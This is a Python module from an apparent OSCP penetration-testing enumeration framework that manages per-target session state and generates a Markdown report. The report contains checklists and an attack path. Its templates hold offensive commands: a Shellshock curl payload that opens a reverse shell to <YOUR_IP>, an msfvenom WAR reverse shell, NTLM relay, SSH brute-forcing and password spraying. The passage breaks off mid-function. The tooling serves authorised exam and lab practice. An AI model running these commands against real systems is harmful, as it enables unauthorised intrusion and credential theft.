"""
core/session.py — Session and state management

Handles:
  - Output directory creation per target
  - Structured logging to file + console
  - Persistent session state (JSON)
  - Discovered data storage (ports, services, domains)
  - Final structured Markdown report generation
"""

import json
import logging
import re
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# Directory layout under output/targets/<IP>/
# ---------------------------------------------------------------------------

SESSION_DIRS = ["scans", "loot", "web", "smb", "ldap"]
STATE_FILE   = "session.json"
NOTES_FILE   = "notes.md"


# ---------------------------------------------------------------------------
# OSCP manual checklist items keyed by port number
# Each entry is a list of plain strings; {ip} and {domain} are substituted
# at report-generation time.
# ---------------------------------------------------------------------------

_CHECKLIST: Dict[int, List[str]] = {
    21:   [
        "Test anonymous FTP login: `ftp {ip}`",
        "Check for readable / writable directories",
        "Download interesting files (configs, backups)",
    ],
    22:   [
        "Record SSH banner & version → search for CVEs",
        "Enumerate auth methods: `ssh-audit {ip}`",
        "Try obtained credentials (only if in scope)",
    ],
    25:   [
        "Enumerate valid SMTP users: `smtp-user-enum -M VRFY -U users.txt -t {ip}`",
        "Check for open relay",
    ],
    53:   [
        "Attempt zone transfer: `dig axfr {domain} @{ip}`",
        "Subdomain brute-force: `gobuster dns -d {domain} -w subdomains-top1million-5000.txt`",
    ],
    80:   [
        "Directory brute-force: `gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/common.txt`",
        "Check robots.txt and sitemap.xml: `curl http://{ip}/robots.txt`",
        "Identify web stack (WhatWeb, response headers, cookies)",
        "Test LFI / RFI / SQLi on all parameters",
        "Check for default credentials on login pages",
    ],
    443:  [
        "Inspect TLS certificate SANs: `openssl s_client -connect {ip}:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep DNS:`",
        "Directory brute-force: `gobuster dir -u https://{ip} -w /usr/share/seclists/Discovery/Web-Content/common.txt -k`",
        "Add SAN hostnames to /etc/hosts and re-scan each vhost",
    ],
    88:   [
        "AS-REP Roast (no pre-auth accounts): `impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass -usersfile users.txt`",
        "Kerberoast (requires valid credentials): `impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request`",
        "Password spray (check lockout policy first): `kerbrute passwordspray -d {domain} --dc {ip} users.txt Password123`",
    ],
    110:  [
        "Banner grab: `nc {ip} 110`",
        "List mailboxes if credentials available: `nc {ip} 110` → USER x / PASS x / LIST",
    ],
    139:  [
        "SMB null session: `smbclient -L //{ip} -N`",
    ],
    143:  [
        "Banner grab: `nc {ip} 143`",
        "List mailboxes: `nc {ip} 143` → A1 LOGIN user pass / A2 LIST",
    ],
    161:  [
        "Community string sweep: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {ip}`",
        "Full walk: `snmpwalk -v2c -c public {ip}`",
        "Running processes: `snmpwalk -v2c -c public {ip} 1.3.6.1.2.1.25.4.2.1.2`",
        "Network interfaces (pivot detection): `snmpwalk -v2c -c public {ip} 1.3.6.1.2.1.2.2.1.2`",
    ],
    389:  [
        "Anonymous bind: `ldapsearch -x -H ldap://{ip} -b ''`",
        "Full dump: `ldapsearch -x -H ldap://{ip} -b 'DC=domain,DC=local'`",
        "Check for accounts without Kerberos pre-auth (AS-REP Roasting)",
        "Find SPNs (Kerberoastable): `ldapsearch -x -H ldap://{ip} -b 'DC=domain,DC=local' '(servicePrincipalName=*)'`",
    ],
    445:  [
        "Null session share list: `smbclient -L //{ip} -N`",
        "Map shares: `smbmap -H {ip} -u '' -p ''`",
        "Full enum: `enum4linux -a {ip}`",
        "Check EternalBlue (MS17-010) if target is older Windows",
    ],
    636:  [
        "LDAPS anonymous bind: `ldapsearch -x -H ldaps://{ip} -b ''`",
    ],
    1433: [
        "Try sa:(blank) credentials: `mssqlclient.py sa:@{ip}`",
        "Check xp_cmdshell if authenticated",
        "Enumerate linked servers",
    ],
    2049: [
        "List NFS exports: `showmount -e {ip}`",
        "Mount and inspect: `sudo mount -t nfs {ip}:/ /mnt/nfs`",
        "Check for no_root_squash permission",
    ],
    3268: [
        "Global catalog LDAP: `ldapsearch -x -H ldap://{ip}:3268 -b ''`",
    ],
    3306: [
        "Try root:(blank) credentials: `mysql -h {ip} -u root`",
        "Enumerate accessible databases if authenticated",
    ],
    3389: [
        "Check version → BlueKeep (CVE-2019-0708) on old/unpatched systems",
        "Try obtained credentials with an RDP client",
    ],
    5432: [
        "Try postgres:(blank): `psql -h {ip} -U postgres`",
        "Enumerate databases if authenticated",
    ],
    5900: [
        "Try VNC with no password or default password",
        "Check VNC version for known CVEs",
    ],
    5985: [
        "If credentials found: `evil-winrm -i {ip} -u USER -p PASS`",
    ],
    5986: [
        "If credentials found: `evil-winrm -i {ip} -u USER -p PASS -S`",
    ],
    6379: [
        "Check unauthenticated access: `redis-cli -h {ip} ping`",
        "Enumerate keys: `redis-cli -h {ip} keys *`",
        "⚠️  Write primitive (CONFIG SET dir/dbfilename) is MANUAL ONLY — do not automate",
    ],
    8080: [
        "Directory brute-force: `gobuster dir -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt`",
        "Check for Tomcat manager: `curl -s http://{ip}:8080/manager/html` (try tomcat:tomcat, admin:admin, admin:s3cret)",
        "Tomcat deploy WAR shell: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war` → upload via /manager",
        "Check for Jenkins: `curl -s http://{ip}:8080/login` — default creds admin:admin",
        "Check for admin panels / developer interfaces (Webmin, Glassfish, JBoss)",
    ],
    8443: [
        "Inspect TLS cert for hostnames",
        "Directory brute-force on alternate HTTPS port",
    ],
}

# Port → short label for checklist section headers
_PORT_LABEL: Dict[int, str] = {
    21:    "FTP",
    22:    "SSH",
    23:    "Telnet",
    25:    "SMTP",
    53:    "DNS",
    80:    "HTTP",
    88:    "Kerberos",
    110:   "POP3",
    111:   "RPC/Portmapper",
    139:   "NetBIOS/SMB",
    143:   "IMAP",
    161:   "SNMP",
    389:   "LDAP",
    443:   "HTTPS",
    445:   "SMB",
    465:   "SMTPS",
    587:   "SMTP (Submission)",
    636:   "LDAPS",
    993:   "IMAPS",
    995:   "POP3S",
    1433:  "MSSQL",
    2049:  "NFS",
    3268:  "LDAP Global Catalog",
    3269:  "LDAP GC (SSL)",
    3306:  "MySQL",
    3389:  "RDP",
    5432:  "PostgreSQL",
    5900:  "VNC",
    5984:  "CouchDB",
    5985:  "WinRM",
    5986:  "WinRM (SSL)",
    6379:  "Redis",
    8080:  "HTTP-Alt",
    8443:  "HTTPS-Alt",
    9200:  "Elasticsearch",
    27017: "MongoDB",
}

# Port → emoji for report aesthetics
_PORT_EMOJI: Dict[int, str] = {
    21:    "📁",
    22:    "🔒",
    23:    "📡",
    25:    "📧",
    53:    "🌐",
    80:    "🌐",
    88:    "🎫",
    110:   "📬",
    111:   "🔌",
    139:   "📂",
    143:   "📬",
    161:   "📡",
    389:   "📋",
    443:   "🔐",
    445:   "📂",
    465:   "📧",
    587:   "📧",
    636:   "📋",
    993:   "📬",
    995:   "📬",
    1433:  "🗄️",
    2049:  "📁",
    3268:  "📋",
    3269:  "📋",
    3306:  "🗄️",
    3389:  "🖥️",
    5432:  "🗄️",
    5900:  "🖥️",
    5984:  "🗄️",
    5985:  "⚡",
    5986:  "⚡",
    6379:  "🗄️",
    8080:  "🌐",
    8443:  "🔐",
    9200:  "🗄️",
    27017: "🗄️",
}


# ---------------------------------------------------------------------------
# Discovered data — written by Engine, read by Recommender
# ---------------------------------------------------------------------------

@dataclass
class TargetInfo:
    ip:            str
    domain:        str                   = ""
    os_guess:      str                   = "Unknown"
    open_ports:    Set[int]              = field(default_factory=set)
    # port → {"service": str, "version": str, "banner": str}
    port_details:  Dict[int, dict]       = field(default_factory=dict)
    domains_found: List[str]             = field(default_factory=list)
    shares_found:  List[str]             = field(default_factory=list)
    web_paths:     List[str]             = field(default_factory=list)
    users_found:   List[str]             = field(default_factory=list)  # deduped on save
    notes:         List[str]             = field(default_factory=list)
    # Ports the user explicitly skipped with Ctrl+C during a previous run.
    # Persisted so --resume does not endlessly retry aborted scans.
    skipped_ports:      Set[int]         = field(default_factory=set)
    # Confirmed executable CGI/shell/Perl script URLs found by the sniper scan.
    # Each entry gets its own Shellshock exploitation template in finalize_notes().
    cgi_scripts_found:  List[str]        = field(default_factory=list)
    # ── Arsenal Recommender context ──────────────────────────────────────────
    # os_type: coarse classification derived from TTL, Nmap OS match, or SMB
    #   values: "Windows" | "Linux" | "" (unknown)
    os_type:            str              = ""
    # os_version: freeform string — Windows build year ("2012", "2019") or
    #   Linux kernel version ("5.15.0") extracted from Nmap version strings
    os_version:         str              = ""
    # is_domain_controller: True when Kerberos+LDAP ports open, or NXC/enum4linux
    #   output explicitly names this host as a DC
    is_domain_controller: bool           = False
    # ntlm_hashes_found: True when any module captures NTLM hashes (responder,
    #   secretsdump, etc.) — triggers Pass-the-Hash templates in the Recommender
    ntlm_hashes_found:  bool             = False

    def add_port(self, port: int, service: str = "", version: str = "",
                 banner: str = "") -> None:
        self.open_ports.add(port)
        self.port_details[port] = {
            "service": service,
            "version": version,
            "banner":  banner,
        }

    def to_dict(self) -> dict:
        return {
            "ip":           self.ip,
            "domain":       self.domain,
            "os_guess":     self.os_guess,
            "open_ports":   sorted(self.open_ports),
            "port_details": {str(k): v for k, v in self.port_details.items()},
            "domains_found":        self.domains_found,
            "shares_found":         self.shares_found,
            "web_paths":            self.web_paths,
            "users_found":          self.users_found,
            "notes":                self.notes,
            "skipped_ports":        sorted(self.skipped_ports),
            "cgi_scripts_found":    self.cgi_scripts_found,
            "os_type":              self.os_type,
            "os_version":           self.os_version,
            "is_domain_controller": self.is_domain_controller,
            "ntlm_hashes_found":    self.ntlm_hashes_found,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "TargetInfo":
        obj = cls(ip=data["ip"], domain=data.get("domain", ""))
        obj.os_guess       = data.get("os_guess", "Unknown")
        obj.open_ports     = set(data.get("open_ports", []))
        obj.port_details   = {int(k): v for k, v in data.get("port_details", {}).items()}
        obj.domains_found        = data.get("domains_found", [])
        obj.shares_found         = data.get("shares_found", [])
        obj.web_paths            = data.get("web_paths", [])
        obj.users_found          = data.get("users_found", [])
        obj.notes                = data.get("notes", [])
        obj.skipped_ports        = set(data.get("skipped_ports", []))
        obj.cgi_scripts_found    = data.get("cgi_scripts_found", [])
        obj.os_type              = data.get("os_type", "")
        obj.os_version           = data.get("os_version", "")
        obj.is_domain_controller = data.get("is_domain_controller", False)
        obj.ntlm_hashes_found    = data.get("ntlm_hashes_found", False)
        return obj


# ---------------------------------------------------------------------------
# JSON Lines log formatter
# ---------------------------------------------------------------------------

class _JsonFormatter(logging.Formatter):
    """
    Emits one JSON object per log record (JSON Lines format).

    Output fields:
      timestamp  — ISO 8601 with milliseconds, UTC
      level      — DEBUG / INFO / WARNING / ERROR / CRITICAL
      module     — logger name (e.g. "oscp.10.10.10.5")
      message    — fully rendered log message (args already interpolated)
    """

    def format(self, record: logging.LogRecord) -> str:
        record_dict = {
            "timestamp": datetime.fromtimestamp(
                record.created, tz=timezone.utc
            ).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
            "level":   record.levelname,
            "module":  record.name,
            "message": record.getMessage(),
        }
        if record.exc_info:
            record_dict["exception"] = self.formatException(record.exc_info)
        return json.dumps(record_dict, ensure_ascii=False)


# ---------------------------------------------------------------------------
# Session — owns the filesystem layout and logging
# ---------------------------------------------------------------------------

class Session:
    """
    One Session per target IP.  Creates the output directory tree, sets up
    logging, and persists discovered state between runs.
    """

    def __init__(
        self,
        target:      str,
        domain:      str  = "",
        output_base: str  = "output/targets",
        verbose:     bool = False,
        lhost:       str  = "",
        resume:      bool = False,
    ) -> None:
        self.target      = target
        self.domain      = domain
        self.output_base = Path(output_base)
        self.verbose     = verbose
        self.lhost       = lhost
        self.resume      = resume

        # Active timeout (seconds) set by the engine before each module call.
        # run_wrapper uses this as a fallback when no explicit timeout is given.
        # None means no timeout (unlimited).
        self.module_timeout: Optional[int] = None

        self.target_dir: Path = self.output_base / target
        self.started_at: str  = datetime.now(timezone.utc).isoformat()

        # Sub-directories
        self.dirs: Dict[str, Path] = {
            name: self.target_dir / name for name in SESSION_DIRS
        }

        self._create_directories()

        self.log = self._setup_logging()

        # Load or create target info
        self.info = self._load_state()

        # Update domain if provided (may differ between runs)
        if domain and not self.info.domain:
            self.info.domain = domain

    # ------------------------------------------------------------------
    # Public helpers
    # ------------------------------------------------------------------

    def path(self, category: str, filename: str) -> Path:
        """Return a full path inside a session sub-directory."""
        base = self.dirs.get(category, self.target_dir)
        return base / filename

    def save_state(self) -> None:
        """Persist current TargetInfo to session.json.

        Also writes output/targets/<IP>/users.txt whenever users_found is
        non-empty so spray tools can reference it immediately.
        Deduplicates users_found in-place before saving.
        """
        # Deduplicate users in-place (preserving insertion order via dict)
        self.info.users_found = list(dict.fromkeys(self.info.users_found))

        state_path = self.target_dir / STATE_FILE
        with state_path.open("w") as fh:
            json.dump(self.info.to_dict(), fh, indent=2)
        self.log.debug("Session state saved → %s", state_path)

        # Auto-write users.txt for spray tools whenever users are known
        if self.info.users_found:
            users_path = self.target_dir / "users.txt"
            users_path.write_text(
                "\n".join(sorted(self.info.users_found)) + "\n",
                encoding="utf-8",
            )
            self.log.debug("users.txt updated (%d users) → %s",
                           len(self.info.users_found), users_path)

    def add_note(self, text: str) -> None:
        """Append a timestamped note to TargetInfo (finalize_notes writes the file)."""
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {text}"
        self.info.notes.append(line)

    def add_manual_command(self, cmd: str, context: str = "") -> None:
        """Append a manual command to <target_dir>/_manual_commands.txt.

        This file collects every [MANUAL] hint emitted during the run so the
        operator has a single, copy-paste-ready reference without having to
        scroll through notes.md or terminal output.

        Args:
            cmd:     The exact shell command the operator should run manually.
            context: Short description explaining why this command is suggested.
        """
        try:
            manual_file: Path = self.target_dir / "_manual_commands.txt"
            with manual_file.open("a", encoding="utf-8") as fh:
                if context:
                    fh.write(f"# {context}\n")
                fh.write(f"{cmd}\n\n")
        except Exception:
            pass  # never let file I/O block a scan

    def finalize_notes(self) -> None:
        """
        Write (or overwrite) notes.md with a fully structured Markdown report.

        Formatting conventions used throughout:
          ✅  confirmed success / access granted
          📁  file / share / path discovery
          ⚠️   vulnerability or high-value misconfiguration
          💡  manual follow-up command (always inside a - [ ] checklist item)
          ```  raw tool output always wrapped in fenced code blocks
        """
        notes_path = self.target_dir / NOTES_FILE
        date_str   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip         = self.info.ip
        domain     = self.info.domain or "N/A"
        os_guess   = self.info.os_guess or "Unknown"
        ports_str  = ", ".join(
            f"`{p}`" for p in sorted(self.info.open_ports)
        ) or "*None discovered*"

        lines: List[str] = []

        # ── Header ────────────────────────────────────────────────────
        lines += [
            f"# 🗂️ OSCP Enumeration Report — `{ip}`",
            "",
            "> Generated by **OSCP Enumeration Framework** — by acanoman  ",
            f"> {date_str}",
            "",
            "---",
            "",
        ]

        # ── Attack Path ───────────────────────────────────────────────
        # Built dynamically from ALL session findings — ordered by priority.
        # Every entry is a MANUAL command; nothing runs automatically.
        attack_steps = self._build_attack_path()
        if attack_steps:
            _sev_emoji = {
                "critical": "🔴",
                "high":     "🟠",
                "medium":   "🟡",
                "info":     "🔵",
            }
            lines += [
                "## 🎯 Prioritized Attack Path",
                "",
                "> Auto-generated from enumeration findings. Run these in order.  ",
                "> Every command below is **manual** — nothing was executed automatically.",
                "",
            ]
            for sev, desc, cmd in attack_steps:
                emoji = _sev_emoji.get(sev, "⚪")
                lines.append(f"#### {emoji} `[{sev.upper()}]` {desc}")
                lines.append("```bash")
                lines.append(cmd)
                lines.append("```")
                lines.append("")
            lines += ["---", ""]

        # ── Table of Contents ─────────────────────────────────────────
        # Anchor format: GitHub-flavored Markdown (emoji stripped, lowercase,
        # spaces → hyphens).  Works in Obsidian, Typora, and GitHub preview.
        _privesc_anchor = (
            "#windows-privesc-arsenal"
            if self.info.os_type == "Windows"
            else "#linux-privesc-arsenal"
        )
        lines += [
            "## 📑 Quick Navigation",
            "",
            "| # | Section | Jump |",
            "|---|---------|------|",
            "| 1 | 🎯 Target Overview | [↓](#target-overview) |",
            "| 2 | ⚠️ Vulnerabilities & Critical Findings | [↓](#vulnerabilities--critical-findings) |",
            "| 3 | 📋 OSCP Manual Checklist | [↓](#oscp-manual-checklist) |",
            "| 4 | 🛠️ Attacker Setup | [↓](#attacker-setup--download-binaries-to-kali) |",
            "| 5 | 🐚 Post-Shell Survival Kit | [↓](#post-shell-survival-kit) |",
            f"| 6 | 💥 PrivEsc Arsenal | [↓]({_privesc_anchor}) |",
            "| 7 | 🕸️ Pivoting & Tunnelling | [↓](#pivoting--tunnelling-arsenal) |",
            "",
            "---",
            "",
        ]

        # ── Target Overview (merged summary + services — no port duplication) ─
        lines += [
            "## 🎯 Target Overview",
            "",
            "| Field | Value |",
            "|-------|-------|",
            f"| **IP Address** | `{ip}` |",
            f"| **Domain** | `{domain}` |",
            f"| **OS Guess** | {os_guess} |",
            f"| **Scan Date** | {date_str} |",
            "",
        ]

        # Services table immediately follows — this IS the port list
        if self.info.open_ports:
            lines += [
                "| Port | Protocol | Service | Version |",
                "|------|----------|---------|---------|",
            ]
            for port in sorted(self.info.open_ports):
                details = self.info.port_details.get(port, {})
                svc     = details.get("service", _PORT_LABEL.get(port, "unknown"))
                ver     = details.get("version", "") or "—"
                proto   = details.get("proto", "tcp")
                lines.append(f"| `{port}` | {proto} | {svc} | {ver} |")
            lines.append("")

        # ── Alerts & Findings ─────────────────────────────────────────
        # Partition notes into three buckets by keyword so the report
        # presents the most critical information first.
        vuln_notes = [n for n in self.info.notes if any(
            kw in n.lower() for kw in (
                "vulnerable", "cve-", "signing disabled", "no_root_squash",
                "unauthenticated", "empty password", "backdoor",
            )
        )]
        success_notes = [n for n in self.info.notes if any(
            kw in n.lower() for kw in (
                "anonymous", "anon login", "login allowed", "null session",
                "guest", "permitted", "pong", "pwn3d",
            )
        ) and n not in vuln_notes]
        discovery_notes = [n for n in self.info.notes if any(
            kw in n.lower() for kw in (
                "found", "detected", "discovered", "export", "share",
                "user", "san", "domain",
            )
        ) and n not in vuln_notes and n not in success_notes]

        if vuln_notes:
            lines += ["## ⚠️ Vulnerabilities & Critical Findings", ""]
            for note in vuln_notes:
                # Ensure emoji prefix is present
                prefix = "" if note.startswith("⚠️") else "⚠️  "
                lines.append(f"- {prefix}{note}")
            lines.append("")

        if success_notes:
            lines += ["## ✅ Confirmed Access & Anonymous Sessions", ""]
            for note in success_notes:
                prefix = "" if note.startswith("✅") else "✅  "
                lines.append(f"- {prefix}{note}")
            lines.append("")

        if discovery_notes:
            lines += ["## 📁 Enumeration Discoveries", ""]
            for note in discovery_notes:
                lines.append(f"- {note}")
            lines.append("")

        # ── Detected Versions + Searchsploit ─────────────────────────
        version_notes = [
            n for n in self.info.notes
            if re.search(r'^(\[\d{2}:\d{2}:\d{2}\] )?VERSION: port', n)
        ]
        if version_notes:
            lines += [
                "## 🔍 Detected Service Versions",
                "",
                "| Port | Service | Version | Searchsploit |",
                "|------|---------|---------|--------------|",
            ]
            for vn in version_notes:
                # Strip timestamp
                clean = re.sub(r'^\[\d{2}:\d{2}:\d{2}\] ', '', vn)
                # "VERSION: port 22 — openssh 7.4 detected | searchsploit openssh 7.4"
                m = re.search(
                    r'VERSION: port (\d+) — (\S+) ([\d.]+) detected \| (searchsploit .+)$',
                    clean,
                )
                if m:
                    lines.append(
                        f"| `{m.group(1)}` | {m.group(2)} | `{m.group(3)}` "
                        f"| `{m.group(4)}` |"
                    )
            lines.append("")

        # ── SMB Shares ────────────────────────────────────────────────
        if self.info.shares_found:
            # Build access-level dict from notes written by _parse_shares()
            _share_access: Dict[str, str] = {}
            for _n in self.info.notes:
                _m = re.search(r"SMB share '([^']+)' access:\s*(.+)$", _n)
                if _m:
                    _share_access[_m.group(1)] = _m.group(2).strip()

            lines += [
                "## 📁 SMB Shares Found",
                "",
                "| Share | Access | Notes |",
                "|-------|--------|-------|",
            ]
            for share in self.info.shares_found:
                access = _share_access.get(share, "—")
                lines.append(f"| `{share}` | {access} | — |")
            lines.append("")
            lines += [
                "> **Next step:** Connect to each readable share:",
                "",
                "```bash",
            ]
            for share in self.info.shares_found:
                lines.append(f"smbclient //{ip}/{share} -N")
            lines += ["```", ""]

        # ── Users Found ───────────────────────────────────────────────
        if self.info.users_found:
            lines += [
                "## 🔑 User Accounts Discovered",
                "",
                "```",
            ]
            for user in sorted(self.info.users_found):
                lines.append(user)
            lines += ["```", ""]

        # ── CGI / Shellshock Attack Surface ──────────────────────────
        # One exploitation template is generated per discovered script URL
        # so the operator can copy-paste the exact curl payload without
        # editing anything.
        if self.info.cgi_scripts_found:
            lines += [
                "## ☢️ RED ALERT — CGI Script Attack Surface",
                "",
                "> **Executable scripts were discovered dynamically by the CGI sniper.**  ",
                "> Test EACH URL for Shellshock (CVE-2014-6271) and parameter injection.",
                "> Replace `<YOUR_IP>` with your tun0 address before running the reverse shell.",
                "",
            ]
            for url in self.info.cgi_scripts_found:
                lines += [
                    "---",
                    "",
                    "### ☢️ RED ALERT: POTENTIAL CGI/SHELLSHOCK VULNERABILITY",
                    "",
                    f"An executable script was discovered at a dynamic path: `{url}`",
                    "",
                    "RCE attack vector:",
                    "",
                    f'- [ ] **Verify:** `curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}`',
                    f'- [ ] Reverse Shell: `curl -H "User-Agent: () {{ :; }}; echo; /bin/bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" {url}`',
                    "",
                    "> 💡 **TACTICAL NEXT STEP** — You are likely landing as a web service "
                    "account (e.g., `www-data`). Immediately execute `sudo -l` and check "
                    "`/etc/passwd` for shell-enabled users to pivot to.",
                    "",
                ]
            lines.append("")

        # ── Web Paths ─────────────────────────────────────────────────
        if self.info.web_paths:
            lines += [
                f"## 🌐 Web Paths ({len(self.info.web_paths)} discovered)",
                "",
                "```",
            ]
            for path in self.info.web_paths[:50]:
                lines.append(path)
            if len(self.info.web_paths) > 50:
                lines.append(
                    f"... and {len(self.info.web_paths) - 50} more "
                    "(see web/ directory)"
                )
            lines += ["```", ""]

        # ── OSCP Manual Checklist ─────────────────────────────────────
        lines += [
            "---",
            "",
            "## 📋 OSCP Manual Checklist",
            "",
            "> Work through each item. Mark `[x]` when complete or ruled out.",
            "> Items prefixed `💡` are exact commands — copy and run.",
            "",
        ]

        # AD-only ports — only include checklist if a domain was identified
        _AD_ONLY_PORTS = {88, 389, 636, 3268, 3269}

        checklist_written = False
        for port in sorted(self.info.open_ports):
            # Skip Kerberos/LDAP checklist items when no domain detected
            if port in _AD_ONLY_PORTS and not self.info.domain:
                continue
            items = _CHECKLIST.get(port)
            if not items:
                continue
            label = _PORT_LABEL.get(port, f"Port {port}")
            emoji = _PORT_EMOJI.get(port, "🔧")
            lines.append(f"### {emoji} {label} — port `{port}`")
            lines.append("")
            for item in items:
                formatted = item.format(
                    ip=ip,
                    domain=self.info.domain or "TARGET.DOMAIN",
                )
                # Items that contain a backtick are commands — prefix with 💡
                if "`" in formatted:
                    lines.append(f"- [ ] 💡 {formatted}")
                else:
                    lines.append(f"- [ ] {formatted}")
            lines.append("")
            checklist_written = True

        if not checklist_written:
            lines += [
                "*No specific checklist items — investigate open ports manually.*",
                "",
            ]

        # ── Credential reuse reminder ─────────────────────────────────
        lines += [
            "### 🔑 Credential Reuse (always)",
            "",
            "- [ ] 💡 Try every discovered credential against every open service",
            "- [ ] Check password policy before spraying (avoid lockouts)",
            "- [ ] Test `username:username` and `username:password123` patterns",
            "",
        ]

        # ── Manual hints from modules (💡 tagged notes) ───────────────
        manual_notes = [
            n for n in self.info.notes
            if "💡" in n or "[MANUAL]" in n.upper()
        ]
        if manual_notes:
            lines += [
                "---",
                "",
                "## 💡 Manual Follow-Up Commands",
                "",
                "> These commands were generated during enumeration.  ",
                "> Review each one — they require credentials or manual judgment.",
                "",
            ]
            for note in manual_notes:
                # Strip leading timestamp "[HH:MM:SS] " for cleaner display
                clean = note
                if clean.startswith("[") and "]" in clean[:10]:
                    clean = clean.split("] ", 1)[-1]
                # Extract the command part (after 💡 [MANUAL])
                cmd_part = clean.replace("💡", "").replace("[MANUAL]", "").strip()
                lines.append(f"- [ ] 💡 `{cmd_part}`")
            lines.append("")

        # ── Full session notes (raw timeline) ─────────────────────────
        non_manual = [
            n for n in self.info.notes
            if "💡" not in n and "[MANUAL]" not in n.upper()
        ]
        if non_manual:
            lines += [
                "---",
                "",
                "## 📝 Session Timeline",
                "",
                "```",
            ]
            for note in non_manual:
                lines.append(note)
            lines += ["```", ""]

        # ── Arsenal Recommender ───────────────────────────────────────────
        # Import lazily to avoid circular deps at module load time.
        # Pass lhost so all <LHOST> placeholders in transfer commands are
        # pre-filled with the operator's tun0 IP (from --lhost flag).
        try:
            from core.advisor import generate_advisor_markdown
            lines.append(
                generate_advisor_markdown(
                    self.info,
                    lhost=self.lhost if self.lhost else "<LHOST>",
                )
            )
        except Exception as exc:  # noqa: BLE001
            self.log.warning("Arsenal Recommender failed (non-fatal): %s", exc)

        lines += [
            "---",
            "",
            "*Generated by **OSCP Enumeration Framework** — by acanoman*",
            "",
        ]

        notes_path.write_text("\n".join(lines), encoding="utf-8")
        self.log.info("Notes written → %s", notes_path)

    # ------------------------------------------------------------------
    # Attack Path Synthesis
    # ------------------------------------------------------------------

    def _build_attack_path(self) -> List[Tuple[str, str, str]]:
        """
        Synthesize ALL session findings into a prioritized list of manual steps.
        Returns [(severity, description, command), ...] ordered critical → info.
        Nothing here runs automatically — every entry is a manual command.
        """
        steps: List[Tuple[str, str, str]] = []
        ip         = self.info.ip
        domain     = self.info.domain or ""
        users_file = self.target_dir / "users.txt"
        ldap_dir   = self.target_dir / "ldap"
        uf         = str(users_file) if users_file.exists() else "<users.txt>"

        # ── CRITICAL ─────────────────────────────────────────────────────────
        _seen: set = set()

        def _once(key: str) -> bool:
            if key in _seen:
                return False
            _seen.add(key)
            return True

        for note in self.info.notes:
            nl = note.lower()
            if _once("ntlm_relay") and re.search(r'smb signing disabled|ntlm relay', nl):
                steps.append((
                    "critical",
                    "NTLM relay viable — SMB signing disabled",
                    f"sudo responder -I tun0 -wd\n"
                    f"  impacket-ntlmrelayx -t smb://{ip} -smb2support",
                ))
            if _once("eternalblue") and re.search(r'smbv1.*eternalblue|ms17-010', nl):
                steps.append((
                    "critical",
                    "SMBv1 detected — verify EternalBlue (MS17-010)",
                    f"nmap -p 445 --script smb-vuln-ms17-010 {ip}",
                ))
            if _once("heartbleed") and "heartbleed" in nl:
                steps.append((
                    "critical",
                    "Heartbleed (CVE-2014-0160) — memory leak, creds extractable",
                    f"nmap -p 443 --script ssl-heartbleed {ip}",
                ))

        for url in self.info.cgi_scripts_found:
            steps.append((
                "critical",
                f"CGI script — test Shellshock: {url}",
                f'curl -H "User-Agent: () {{ :; }}; echo; /usr/bin/id" {url}',
            ))

        # SSH CVEs
        for note in self.info.notes:
            m = re.search(r'HIGH: SSH CVEs detected:\s*(\[.*?\])', note)
            if m:
                steps.append((
                    "critical",
                    f"SSH CVEs: {m.group(1)} — research and verify exploitability",
                    f"searchsploit openssh",
                ))
                break

        # OpenSSH < 7.7 username enumeration (CVE-2018-15473)
        for note in self.info.notes:
            if _once("ssh_userenum") and re.search(r'CVE-2018-15473', note):
                m = re.search(r'OpenSSH ([\d.]+) < 7\.7', note)
                ver = m.group(1) if m else "old"
                steps.append((
                    "high",
                    f"OpenSSH {ver} — CVE-2018-15473 username enumeration",
                    f"use auxiliary/scanner/ssh/ssh_enumusers  "
                    f"# set RHOSTS {ip}; set USER_FILE {uf}; run",
                ))
                break

        # SambaCry critical
        for note in self.info.notes:
            if _once("sambacry") and re.search(r'SambaCry|CVE-2017-7494', note):
                m = re.search(r'Samba ([\d.]+)', note)
                ver = m.group(1) if m else ""
                steps.append((
                    "critical",
                    f"Samba {ver} — potential SambaCry (CVE-2017-7494)",
                    f"searchsploit sambacry",
                ))
                break

        # NSE vuln scan CRITICAL findings (CVEs found in vulns.txt)
        for note in self.info.notes:
            if _once("nse_crit") and re.search(r'CRITICAL: NSE vuln scan', note):
                clean = re.sub(r'^\[\d{2}:\d{2}:\d{2}\] ', '', note)
                steps.append((
                    "critical",
                    "NSE background vuln scan flagged CVEs — review scans/vulns.txt",
                    f"cat {self.target_dir}/scans/vulns.txt | grep -E 'VULNERABLE|CVE-'",
                ))
                break

        # ── HIGH ─────────────────────────────────────────────────────────────

        # Readable SMB shares
        for share in self.info.shares_found:
            steps.append((
                "high",
                f"Readable SMB share: '{share}'",
                f"smbclient '//{ip}/{share}' -N -c 'ls'",
            ))

        # FTP anonymous
        for note in self.info.notes:
            if _once("ftp_anon") and re.search(r'ftp.*anonymous.*permitted|anonymous.*ftp.*login', note, re.I):
                steps.append((
                    "high",
                    "FTP anonymous login permitted",
                    f"wget -m ftp://anonymous:anonymous@{ip}/",
                ))
                break

        # SSH password auth
        for note in self.info.notes:
            if _once("ssh_passauth") and re.search(r'ssh password auth enabled', note, re.I):
                steps.append((
                    "high",
                    "SSH password auth enabled — brute-force viable",
                    f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3",
                ))
                break

        # NFS exports
        for note in self.info.notes:
            m = re.search(r'NFS export:\s*\S+:([^\s—]+)', note)
            if m:
                export = m.group(1)
                steps.append((
                    "high",
                    f"NFS export accessible: {export}",
